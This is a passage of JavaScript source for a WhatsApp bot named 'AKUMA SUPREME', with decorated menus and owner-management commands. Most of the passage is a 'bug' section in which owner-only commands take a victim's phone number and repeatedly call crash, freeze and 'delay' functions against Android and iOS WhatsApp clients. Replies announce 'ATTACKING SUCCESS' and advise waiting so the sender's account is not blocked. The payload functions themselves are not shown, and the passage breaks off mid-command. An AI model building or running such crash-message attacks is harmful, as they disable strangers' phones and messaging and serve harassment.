> ┃ ➥ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &* 
> ┃                  *𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×*
> ┃ ➥ ᴘʀᴇꜰɪx: *[${prefix}]*
> ┃ ➥ ᴛʏᴘᴇ: *ᴍᴀɪɴ-ᴍᴇɴᴜ*
> ┃ ︼
> ┗━━━━━━━━━━━━━━━━━━━━┛


> ┏━━〔 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 〕━━┓
> ┃ ︻
> ┃ ➥ *.ᴀᴅᴅᴏᴡɴᴇʀ*
> ┃ ➥ *.ᴅᴇʟᴏᴡɴᴇʀ*
> ┃ ➥ *.ᴘᴜʙʟɪᴄ*
> ┃ ➥ *.sᴇʟғ*
> ┃ ︼
> ┗━━━━━━━━━━━━━━━━━━━━┛
`;
                sreply(menu)
            }
            break;
            
            //==============Owner Menu================

            case "tqto": {
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const usedMem = totalMem - freeMem;
                const formattedUsedMem = formatSize(usedMem);
                const formattedTotalMem = formatSize(totalMem);
                let timestamp = speed()
                let latensi = speed() - timestamp
                const name = m.pushName || "No Name";
                const user = `${name}`;
                let menu =
`
> ┏━━〔 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒 〕━━┓
> ┃ ︻
> ┃ ➥ ʙᴏᴛ ɴᴀᴍᴇ: *𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄*
> ┃ ➥ ᴠᴇʀꜱɪᴏɴ: *1.0*
> ┃ ➥ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &* 
> ┃                  *𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×*
> ┃ ➥ ᴘʀᴇꜰɪx: *[${prefix}]*
> ┃ ➥ ᴛʏᴘᴇ: *ᴍᴀɪɴ-ᴍᴇɴᴜ*
> ┃ ︼
> ┗━━━━━━━━━━━━━━━━━━━━┛


> ┏━━〔 𝐓𝐐𝐓𝐎 〕━━┓
> ┃ ➥ *Mr Dracula ‹ owner ›*
> ┃ ➥ *ᴅsᴘʀɪᴍɪs ‹ Teacher ›*
> ┃ ➥ *ᴍɪɴᴀᴛᴏᴅᴇᴠ ‹ Friend ›*
> ┃ ➥ *ʀɪᴢxᴠᴇʟᴢ ‹ sᴘᴏɴsᴏʀ ›*
> ┃ ➥ *ɪɴᴄᴏɴɴᴜʙᴏʏ ‹ ғʀɪᴇɴᴅ ›*
> ┃ ➥ *ᴅʏʙʏᴛᴇᴄʜ ‹ ғʀɪᴇɴᴅ ›*
> ┃ ➥ *ᴄʜʀɪsᴛ ‹ ғʀɪᴇɴᴅ ›*
> ┃ ︼
> ┗━━━━━━━━━━━━━━━━━━━━┛

> ┏━━〔 𝐓𝐄𝐀𝐌 〕━━┓
> ┃ ︻
> ┃ ➥ *AKUMA ‹ ᴍʏᴛᴇᴀᴍ ›*
> ┃ ➥ *BOTLAB ‹ ᴍʏᴛᴇᴀᴍ ›*
> ┃ ︼ *OVL ‹ ᴍʏᴛᴇᴀᴍ ›*
> ┗━━━━━━━━━━━━━━━━━━━━┛
`;
                sreply(menu)
            }
            break;
            
            case "sc": {
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const usedMem = totalMem - freeMem;
                const formattedUsedMem = formatSize(usedMem);
                const formattedTotalMem = formatSize(totalMem);
                let timestamp = speed()
                let latensi = speed() - timestamp
                const name = m.pushName || "No Name";
                const user = `${name}`;
                let menu =
`
𝐀𝐊𝐔𝐌𝐀 𝐋𝐄𝐆𝐈𝐎𝐍 ༒ 𝐃𝐄𝐒 𝐎𝐌𝐁𝐑𝐄𝐒 🜲🏴‍☠️꧂

💀 𝐍𝐎𝐔𝐒 𝐍𝐄 𝐏𝐀𝐑𝐋𝐎𝐍𝐒 𝐏𝐋𝐔𝐒…  
𝐍𝐎𝐒 𝐕𝐎𝐈𝐗 𝐒𝐎𝐍𝐓 𝐃𝐄𝐒 𝐒𝐎𝐔𝐅𝐅𝐋𝐄𝐒 𝐌𝐎𝐑𝐓𝐒 𝐃𝐀𝐍𝐒 𝐋𝐄 𝐕𝐈𝐄𝐔𝐗 𝐕𝐄𝐍𝐓.

💀 𝐍𝐎𝐔𝐒 𝐅𝐑𝐀𝐏𝐏𝐎𝐍𝐒…  
𝐂𝐎𝐌𝐌𝐄 𝐃𝐄𝐒 𝐎𝐌𝐁𝐑𝐄𝐒 𝐒𝐀𝐍𝐒 𝐍𝐎𝐌, 𝐏𝐀𝐑 𝐋𝐀 𝐓𝐄́𝐍𝐄̀𝐁𝐑𝐄.

💀 𝐍𝐎𝐔𝐒 𝐍𝐄 𝐏𝐀𝐑𝐃𝐎𝐍𝐍𝐎𝐍𝐒 𝐏𝐀𝐒…  
𝐋𝐄 𝐒𝐄𝐔𝐋 𝐉𝐔𝐆𝐄 𝐄𝐒𝐓 𝐋𝐀 𝐏𝐔𝐑𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍.

💀 𝐍𝐎𝐔𝐒 𝐏𝐔𝐑𝐈𝐅𝐈𝐎𝐍𝐒…  
𝐏𝐀𝐑 𝐋𝐄 𝐅𝐄𝐔, 𝐏𝐀𝐑 𝐋𝐀 𝐁𝐋𝐄𝐒𝐒𝐔𝐑𝐄, 𝐏𝐀𝐑 𝐋’𝐎𝐔𝐁𝐋𝐈.

💀 𝐋𝐀 𝐋𝐄́𝐆𝐈𝐎𝐍 𝐍𝐄 𝐌𝐄𝐔𝐑𝐓 𝐉𝐀𝐌𝐀𝐈𝐒…  
𝐄𝐋𝐋𝐄 𝐒’𝐄́𝐓𝐄𝐍𝐃, 𝐓𝐀𝐋𝐋𝐄 𝐃𝐀𝐍𝐒 𝐋𝐄 𝐒𝐈𝐋𝐄𝐍𝐂𝐄.

💀 𝐄𝐋𝐋𝐄 𝐄𝐅𝐅𝐀𝐂𝐄…  
𝐋𝐄𝐒 𝐋𝐀̂𝐂𝐇𝐄𝐒, 𝐋𝐄𝐒 𝐌𝐄𝐍𝐓𝐄𝐔𝐑𝐒, 𝐋𝐄𝐒 𝐅𝐀𝐍𝐓𝐎̂𝐌𝐄𝐒 𝐃𝐔 𝐏𝐀𝐒𝐒𝐄́.

💀 𝐍𝐎𝐔𝐒 𝐒𝐎𝐌𝐌𝐄𝐒 𝐋𝐀 𝐌𝐎𝐑𝐓 𝐃𝐀𝐍𝐒 𝐋𝐀 𝐕𝐈𝐄,  
𝐋𝐄 𝐒𝐀𝐍𝐆 𝐃𝐀𝐍𝐒 𝐋𝐀 𝐋𝐔𝐌𝐈𝐄̀𝐑𝐄,  
𝐋𝐀 𝐕𝐄́𝐑𝐈𝐓𝐄́ 𝐃𝐀𝐍𝐒 𝐋𝐄 𝐂𝐇𝐀𝐎𝐒.

💀 𝐏𝐑𝐈𝐄𝐙… 𝐌𝐀𝐈𝐒 𝐍𝐔𝐋 𝐍𝐄 𝐕𝐎𝐔𝐒 𝐄𝐍𝐓𝐄𝐍𝐃𝐑𝐀.  
💀 𝐍𝐎𝐔𝐒 𝐒𝐎𝐌𝐌𝐄𝐒 𝐃𝐄́𝐉𝐀̀ 𝐃𝐀𝐍𝐒 𝐕𝐎𝐒 𝐎𝐌𝐁𝐑𝐄𝐒...

꧁𖤐 𝐀𝐊𝐔𝐌𝐀 𝐋𝐄𝐆𝐈𝐎𝐍 ༒ 𝐃𝐄𝐒 𝐎𝐌𝐁𝐑𝐄𝐒 🜲🏴‍☠️꧂
> *🔗 ᴡʜᴀᴛsᴀᴘᴘ ᴄʜᴀɴɴᴇʟ:*
•https://whatsapp.com/channel/0029Vb7YiFFK0IBqB8tgtA0g

> *ᴛʜᴀɴᴋs ғᴏʀ ʏᴏᴜʀ sᴜᴘᴘᴏʀᴛ 🐉*
`;
                sreply(menu)
            }
            break;
            
//==============Group Menu================
                        case "groupmenu": {
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const usedMem = totalMem - freeMem;
                const formattedUsedMem = formatSize(usedMem);
                const formattedTotalMem = formatSize(totalMem);
                let timestamp = speed()
                let latensi = speed() - timestamp
                const name = m.pushName || "No Name";
                const user = `${name}`;
                let menu =
`
> ┏━━〔 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒 〕━━┓
> ┃ ︻
> ┃ ➥ ʙᴏᴛ ɴᴀᴍᴇ: *𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄*
> ┃ ➥ ᴠᴇʀꜱɪᴏɴ: *1.0*
> ┃ ➥ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &* 
> ┃                  *𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×*
> ┃ ➥ ᴘʀᴇꜰɪx: *[${prefix}]*
> ┃ ➥ ᴛʏᴘᴇ: *ᴍᴀɪɴ-ᴍᴇɴᴜ*
> ┃ ︼
> ┗━━━━━━━━━━━━━━━━━━━━┛
┏━━〔 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔 〕━━┓
> ┃ ︻
> ┃ ➥ *.ᴀᴅᴅ*
> ┃ ➥ *.ᴋɪᴄᴋ*
> ┃ ➥ *.ᴋɪᴄᴋᴀʟʟ*
> ┃ ➥ *.ᴛᴀɢᴀʟʟ*
> ┃ ➥ *.ʜɪᴅᴇᴛᴀɢ*
> ┃ ➥ *.ᴘʀᴏᴍᴏᴛᴇ*
> ┃ ➥ *.ᴅᴇᴍᴏᴛᴇ*
> ┃ ➥ *.sᴇᴛɴᴀᴍᴇ*
> ┃ ➥ *.sᴇᴛᴅᴇsᴄ*
> ┃ ➥ *.sᴇᴛᴘᴘɢᴄ*
> ┃ ➥ *.ᴅᴇʟᴘᴘɢᴄ*
> ┃ ➥ *.ᴏᴘᴇɴᴛɪᴍᴇ*
> ┃ ➥ *.ᴄʟᴏsᴇᴛɪᴍᴇ*
> ┃ ➥ *.ʟᴇᴀᴠᴇɢᴄ*
> ┃ ︼
> ┗━━━━━━━━━━━━━━━━━━━━┛
`;
                sreply(menu)
            }
            break;

            // --- Owner Commands ---
            case 'addowner': {
                if (!isOwner) return zreply(config.message.owner)
                if (!q) return zreply(`— ex: ${x} 509xxx`);

                let bijipler = q.replace(/[^0-9]/g, "")
                if (bijipler.startsWith('0')) return zreply(`— ex: ${x} 509xxx !!`);
                let add = bijipler + '@s.whatsapp.net'

                let capt = `You have now gained owner access to the bot`
                kontributor.push(bijipler)
                fs.writeFileSync(path.resolve(__dirname, './lib/database/owner.json'), JSON.stringify(kontributor), 'utf8')
                zreply("successfully added to owner list")
                await sleep(5000)
                prim.sendMessage(add, { text: capt }) 
            }
            break

            case 'delowner': {
                if (!isOwner) return zreply(config.message.owner)
                if (!q) return zreply(`— ex: ${x} 509xxx`);

                let bijipler = q.replace(/[^0-9]/g,"")
                if (bijipler.startsWith('0')) return zreply(`— ex: ${x} 509xxx !!`);
                let index = kontributor.indexOf(bijipler)
                
                if (index > -1) {
                    kontributor.splice(index,1)
                    fs.writeFileSync(path.resolve(__dirname,'./lib/database/owner.json'),JSON.stringify(kontributor),'utf8')
                    zreply("owner successfully deleted")
                } else {
                    zreply("number not found in owner list")
                }
            }
            break;
            
            case "self": {
                if (!isOwner) return zreply(config.message.owner)

                prim.public = true;
                
                zreply("*Success Change Mode Public To Self*");
            }
            break

            case "public": {
                if (!isOwner) return zreply(config.message.owner)

                prim.public = true;
                
                zreply("*Success Change Mode Self To Public*");
            }
            break;      
            
//============ case bug andro ============
case 'xcrash': {
    if (!isOwner) return zreply(config.message.owner);
    if (!q) return zreply(`*— example: ${x} 509xxx*`);
    let victim = text.split("|")[0]
    let jidx = q.replace(/[^0-9]/g, "");
    if (jidx.startsWith('0')) return zreply(`*— example: ${x} 509xxx* !!`);
        if (victim == "50942350993") {
    return zreply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
  }
    let isTarget = `${jidx}@s.whatsapp.net`;
    let menu = `\n🩸⃟༑⌁⃰🩸⃟༑⌁⃰𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄ཀ͜͡🦠\n›› 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${jidx}\n`;

    const buttonMessage = {
                    image: { url: SR },
                    caption: menu,
                    footer: '×͜×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×',
                    headerType: 6,
                    contextInfo: {
                        forwardingScore: 99999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "1@newsteller",
                            serverMessageId: null,
                            newsletterName: "X"
                        },
                        mentionedJid: ['13135550002@s.whatsapp.net'],
                    },
                    viewOnce: true,
                    buttons: []
                };

                const nativeFlowButton = {
                    buttonId: 'action',
                    buttonText: { displayText: 'Options' },
                    type: 4,
                    nativeFlowInfo: {
                        name: 'single_select',
                        paramsJson: JSON.stringify({
                            title: '¿?',
                            sections: [
                                {
title: "⌜ 𝐀𝐧𝐝𝐫𝐨𝐢𝐝 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ⌟",
highlight_label: "〽️",
rows: [
{         
header: "",
title: "👉 𝐃͢𝐄͡𝐋͜𝐀͢𝐘͡ ⍣᳟ 𝐀͜𝐍͢𝐃͡𝐑͢𝐎🦠",
description: "› delay invis (type: no tag status)",
id: `.delay-andro ${isTarget}`
},
{         
header: "",
title: "👉 𝐅͢𝐂͡ ⍣᳟ 𝐈͜𝐍͢𝐕͡𝐈𝐒🦠",
description: "› fc no click (type: call crash)",
id: `.andro-xbug ${isTarget}`
},
{         
header: "",
title: "👉 𝐅͢𝐂͡ ⍣᳟ 𝐈͜𝐍͢𝐅͡𝐈𝐍𝐈𝐓𝐘🦠",
description: "› fc no click (type: fc perma)",
id: `.fc-one ${isTarget}`
}
]
},
{
title: "⌜ 𝐈𝐨𝐒 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ⌟",
highlight_label: "🍏",
rows: [
{         
header: "",
title: "👉 𝐃͢𝐄͡𝐋͜𝐀͢𝐘͡ ⍣᳟ 𝐈͜𝐎͢𝐒🦠",
description: "› delay invis (type: no tag status)",
id: `.dly-ios ${isTarget}`
},
{       
header: "",
title: "👉 𝐂͢𝐑͡𝐀͜𝐒͢𝐇 ⍣᳟ 𝐈͜𝐎͢𝐒🦠",
description: "› crash ios invisible (type: 26.1)",
id: `.ios-xbug ${isTarget}`
}
         ]
       }
     ] 
   })
 }
};

                buttonMessage.buttons.push(nativeFlowButton);

                return await prim.sendMessage(m.chat, buttonMessage, { quoted: ImageZnX });
            }
            break;

            case 'andro-xbug': {
            if (!isOwner) return zreply(config.message.owner);
                if (!q) return zreply(`— ex: ${x} 509xxx`);
                let victim = text.split("|")[0]
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return zreply(`— ex: ${x} 509xxx !!`);
                if (victim == "50942350993") {
    return zreply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
  }
                
                
let isTarget = `${jidx}@s.whatsapp.net`;
let Menu = `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${isTarget}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗖𝗿𝗮𝘀𝗵𝗲𝗱\n\n_» After you send the virus, Please wait 5 minutes so that whatsapp is not blocked._`
sreply(Menu)

                for (let i = 0; i < 30; i++) {
                   await callPlain(isTarget);
    console.log(chalk.green(`Success Send Bug By ×͜×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×🐉`));
               }
            }
            break;
            
            case 'fc-one': {
            if (!isOwner) return zreply(config.message.owner);
                if (!q) return zreply(`— ex: ${x} 509xxx`);
                let victim = text.split("|")[0]
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return zreply(`— ex: ${x} 509xxx !!`);
                if (victim == "50942350993") {
    return zreply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
  }
                
                
let isTarget = `${jidx}@s.whatsapp.net`;
let Menu = `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${isTarget}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗖𝗿𝗮𝘀𝗵𝗢𝗻𝗲𝗠𝘀𝗴\n\n_» After you send the virus, Please wait 5 minutes so that whatsapp is not blocked._`
sreply(Menu)

                for (let i = 0; i < 1; i++) {
                   await nullExc(isTarget)
                   await nullExc2(isTarget)
    console.log(chalk.green(`Success Send Bug By ×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×🐉`));
               }
            }
            break;
            
            case 'delay-andro': {
            if (!isOwner) return zreply(config.message.owner);
                if (!q) return zreply(`— ex: ${x} 509xxx`);
                let victim = text.split("|")[0]
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return zreply(`— ex: ${x} 509xxx !!`);
                if (victim == "50942350993") {
    return zreply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
  }
                
                
let isTarget = `${jidx}@s.whatsapp.net`;
let Menu = `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${isTarget}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗗𝗲𝗹𝗮𝘆𝗔𝗻𝗱𝗿𝗼\n\n_» After you send the virus, Please wait 5 minutes so that whatsapp is not blocked._`
sreply(Menu)

                for (let i = 0; i < 100; i++) {
              await gsInt(isTarget, ptcp = true);
              await galaxy(isTarget);
              await delay1(isTarget);
    console.log(chalk.green(`Success Send Bug By ×͜×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×͜×🐉`));
               }
            }
            break;
            
                        case 'dly-ios': {
            if (!isOwner) return zreply(config.message.owner);
                if (!q) return zreply(`— ex: ${x} 509xxx`);
                let victim = text.split("|")[0]
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return zreply(`— ex: ${x} 509xxx !!`);
                if (victim == "50942350993") {
    return zreply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
  }
                
                
let isTarget = `${jidx}@s.whatsapp.net`;
let Menu = `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${isTarget}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗗𝗲𝗹𝗮𝘆𝗜𝗼𝘀\n\n_» After you send the virus, Please wait 5 minutes so that whatsapp is not blocked._`
sreply(Menu)

                for (let i = 0; i < 100; i++) {
                   await gsInt(isTarget, ptcp = true)
    console.log(chalk.green(`Success Send Bug By ×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×🐉`));
               }
            }
            break;

            case 'delay-invis': {
    if (!isOwner) return zreply(config.message.owner);
    if (!q) return zreply(`Example Use.\n ${x} 509xxx 5`);
    
    let victim = text.split("|")[0]
    let jidx = args[0]?.replace(/[^0-9]/g, "");
    countL = parseInt(args[1]);
    if (!jidx || jidx.startsWith('0')) return zreply(`- *Example Use.*\n ${x} 509xxx 5`);
    if (isNaN(countL) || countL < 1) return zreply(`- *Example Use.*\n ${x} 509xxx 5`);
    isTarget = `${jidx}@s.whatsapp.net`;
    isTargetX = `${jidx}`;
    if (victim == "50942350993") {
    return zreply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
  }
    sreply(`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${isTargetX}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗗𝗲𝗹𝗮𝘆𝗜𝗻𝘃𝗶𝘀\n\n_» After you send the virus, Please wait 5 minutes so that whatsapp is not blocked._`)    
    for (let i = 0; i < countL; i++) {
    await delay1(isTarget);
    await CInVisible(isTarget, ptcp = true);
    await glxFrcInvisible(prim, isTarget);
    await InVisibleX(isTarget, ptcp = true);
    await gsglx(isTarget);
    await invisibleDozer(prim, isTarget);
    await galaxy(isTarget);
    await ExperimentDelay2(prim, isTarget, false)
    console.log(chalk.green(`Success Send Bug By ×͜×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×͜×🐉`));
    await sleep(1000)
    }}

break;

case 'delay-vis': {
    if (!isOwner) return zreply(config.message.owner);
    if (!q) return zreply(`Example Use.\n ${x} 509xxx 5`);
    
    let victim = text.split("|")[0]
    let jidx = args[0]?.replace(/[^0-9]/g, "");
    countL = parseInt(args[1]);
    if (!jidx || jidx.startsWith('0')) return zreply(`- *Example Use.*\n ${x} 509xxx 5`);
    if (isNaN(countL) || countL < 1) return zreply(`- *Example Use.*\n ${x} 509xxx 5`);
    isTarget = `${jidx}@s.whatsapp.net`;
    isTargetX = `${jidx}`;
    if (victim == "50942350993") {
    return zreply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
  }
    sreply(`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${isTargetX}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗗𝗲𝗹𝗮𝘆𝗩𝗶𝘀\n\n_» After you send the virus, Please wait 5 minutes so that whatsapp is not blocked._`)    
    for (let i = 0; i < countL; i++) {
    await VisibleX(isTarget);
    await CVisible(isTarget);
    await delayJembut(prim, isTarget);
    console.log(chalk.green(`Success Send Bug By ×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×🐉`));
    await sleep(1000)
    }}

break;

            case 'blank-click': {
    if (!isOwner) return zreply(config.message.owner);
    if (!q) return zreply(`Example Use.\n ${x} 509xxx 5`);
    
    let victim = text.split("|")[0]
    let jidx = args[0]?.replace(/[^0-9]/g, "");
    countL = parseInt(args[1]);
    if (!jidx || jidx.startsWith('0')) return zreply(`- *Example Use.*\n ${x} 509xxx 5`);
    if (isNaN(countL) || countL < 1) return zreply(`- *Example Use.*\n ${x} 509xxx 5`);
    isTarget = `${jidx}@s.whatsapp.net`;
    isTargetX = `${jidx}`;
    if (victim == "50942350993") {
    return zreply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
  }
    sreply(`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${isTargetX}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗕𝗹𝗮𝗻𝗸𝗖𝗹𝗶𝗰𝗸\n\n_» After you send the virus, Please wait 5 minutes so that whatsapp is not blocked._`)    
    for (let i = 0; i < countL; i++) {
    await spckfrz(prim, isTarget);
    await Blank2(prim, isTarget);
    console.log(chalk.green(`Success Send Bug By ×͜×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×͜×🐉`));
    await sleep(1000)
    }}

break;

case 'ios-xbug': {
    if (!isOwner) return zreply(config.message.owner);
                if (!q) return zreply(`— ex: ${x} 509xxx`);
                let victim = text.split("|")[0]
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return zreply(`— ex: ${x} 509xxx !!`);
                if (victim == "50942350993") {
    return zreply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
  }
                
                
let isTarget = `${jidx}@s.whatsapp.net`;
let Menu = `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${isTarget}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗖𝗿𝗮𝘀𝗵𝗜𝗼𝘀\n\n_» After you send the virus, Please wait 5 minutes so that whatsapp is not blocked._`
sreply(Menu)

                for (let i = 0; i < 30; i++) {
                   await iosLx(isTarget)
    console.log(chalk.green(`Success Send Bug By ×͜×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜××🐉`));
               }
            }
            break;

case 'trash-ios': {
    if (!isOwner) return zreply(config.message.owner);
    if (!q) return zreply(`Example Use.\n ${x} 509xxx 5`);
    
    let victim = text.split("|")[0]
    let jidx = args[0]?.replace(/[^0-9]/g, "");
    countL = parseInt(args[1]);
    if (!jidx || jidx.startsWith('0')) return zreply(`- *Example Use.*\n ${x} 509xxx 5`);
    if (isNaN(countL) || countL < 1) return zreply(`- *Example Use.*\n ${x} 509xxx 5`);
    isTarget = `${jidx}@s.whatsapp.net`;
    isTargetX = `${jidx}`;
    if (victim == "50942350993") {
    return zreply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
  }
    sreply(`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${isTargetX}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗧𝗿𝗮𝘀𝗵𝗟𝗼𝗰𝗜𝗼𝘀\n\n_» After you send the virus, Please wait 5 minutes so that whatsapp is not blocked._`)    
    for (let i = 0; i < countL; i++) {
    await trashios(isTarget);
    await ios1(isTarget);
    await ios2(isTarget);
    await xStressKing(isTarget, ptcp = true);
    console.log(chalk.green(`Success Send Bug By ×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×🐉`));
    await sleep(1000)
    }}

break;

case 'delay-ios': {
    if (!isOwner) return zreply(config.message.owner);
    if (!q) return zreply(`Example Use.\n ${x} 509xxx 5`);
    
    let victim = text.split("|")[0]
    let jidx = args[0]?.replace(/[^0-9]/g, "");
    countL = parseInt(args[1]);
    if (!jidx || jidx.startsWith('0')) return zreply(`- *Example Use.*\n ${x} 509xxx 5`);
    if (isNaN(countL) || countL < 1) return zreply(`- *Example Use.*\n ${x} 509xxx 5`);
    isTarget = `${jidx}@s.whatsapp.net`;
    isTargetX = `${jidx}`;
    if (victim == "50942350993") {
    return zreply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
  }
    sreply(`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${isTargetX}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗗𝗲𝗹𝗮𝘆𝗜𝗼𝘀\n\n_» After you send the virus, Please wait 5 minutes so that whatsapp is not blocked._`)    
    for (let i = 0; i < countL; i++) {
    await gsglx(isTarget);
    await gsglx2(isTarget);
    console.log(chalk.green(`Success Send Bug By ×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×🐉`));
    await sleep(1000)
    }}

break;

case 'crash-gc': case 'fc-gc': {
